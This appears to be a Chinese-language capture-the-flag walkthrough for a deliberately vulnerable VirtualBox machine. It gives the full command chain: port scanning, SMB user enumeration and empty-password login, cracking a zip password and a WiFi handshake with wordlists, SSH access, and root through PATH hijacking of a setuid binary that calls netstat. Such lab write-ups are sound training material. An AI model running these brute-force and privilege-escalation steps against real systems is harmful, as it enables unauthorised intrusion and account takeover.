VirtualBox双击打开，默认wifi桥接模式！用探测发现IP地址！alivecheck 1.6-快速扫描.jar
192.168.4.22

--------------------------------------------
--------------------------------------------
1、nmap 192.168.4.22 -p- -A

80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2525/tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)

发现目标靶机仅开放了4个tcp端口，一个http的80端口，一个ssh的2525端口，和两个Samba端口139/445。


--------------------------------------------
--------------------------------------------
2、web信息收集

访问80端口，发现很多图片，但是并未有关键信息。用dirb遍历目录也未发现有用信息。不过在主页静态页面底部有个####################GET#####smb##############free，所以转向Samba。


--------------------------------------------
--------------------------------------------
3、Samba

SMB是一种网络通信协议,使用SMB协议可以实现不同类型设备之间数据传递。例如,文件、打印机共享也是基于这个协议。

enum4linux -U 192.168.4.22
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: smb

使用enum4linux查询靶机中的用户信息，发现其中存在一个smb用户

acccheck

使用acccheck爆破用户smb密码，是个空密码！

acccheck -t 192.168.4.22 -u smb -v


使用smbclient查看靶机的共享目录：
smbmap -u 'smb' -p '' -H 192.168.4.22
或者：smbclient -L //192.168.4.22

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (nitin server (Samba, Ubuntu))


smbclient //192.168.4.22/print$ -U smb

smbclient //192.168.4.22/smb -U smb
  main.txt                            N       10  Mon Nov  4 06:45:38 2019
  safe.zip                            N  3424907  Mon Nov  4 06:50:37 2019

get main.txt
get safe.zip

unzip safe.zip 
Archive:  safe.zip
[safe.zip] secret.jpg password: 

下载共享目录下的两个文件，main.txt中只有helo。尝试解压safe.zip，发现需要密码，使用helo发现不对。
--------------------------------------------
--------------------------------------------
4、密码爆破

zip2john safe.zip > pass
john pass

hacker1          (safe.zip)

获得密码！
或者：fcrackzip

unzip safe.zip
Archive:  safe.zip
[safe.zip] secret.jpg password: 
  inflating: secret.jpg              
  inflating: user.cap

爆破获得解压密码为hacker1，解压后里面有个图片和抓包。

图片检查后未发现有用信息。

wireshark user.cap
第一条信息：
1	0.000000	56:dc:1d:19:52:bc	Broadcast	802.11	203	✓		Beacon frame, SN=1781, FN=0, Flags=........, BI=100, SSID=blackjax

打开user.cap发现是一个wifi抓包，wifi名为blackjax。

aircrack-ng爆破wifi密码：
aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap
KEY FOUND! [ snowflake ]
获得密码：
snowflake


ssh blackjax@192.168.4.22 -p 2525
snowflake
python -c 'import pty; pty.spawn("/bin/bash")'

--------------------------------------------
--------------------------------------------
5、内部信息收集



uid=1000(sagar) gid=1000(sagar) groups=1000(sagar),4(adm),24(cdrom),27(sudo)

127.0.0.1:3306

没发现有用的信息！

find / -perm  -4000 2>/dev/null

执行netscan发现是个类似netstat的命令:
/usr/bin/netscan
下载到本地查看！

base64 解码，IDA打开分析：

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setuid(0);
  setgid(0);
  return system("netstat -antp");
}

netscan其实是用system调用的netstat命令！

--------------------------------------------
--------------------------------------------
6、劫持环境变量命令执行

通过劫持环境变量来让netscan在执行netstat时执行恶意程序。


echo "/bin/dash" > /tmp/netstat   
chmod +x /tmp/netstat
export PATH=/tmp:$PATH       ----只有tmp才有写权限
netscan



blackjax@nitin:~$ netscan
# id
uid=0(root) gid=0(root) groups=0(root),1001(blackjax)
# 
成功获得root权限！
























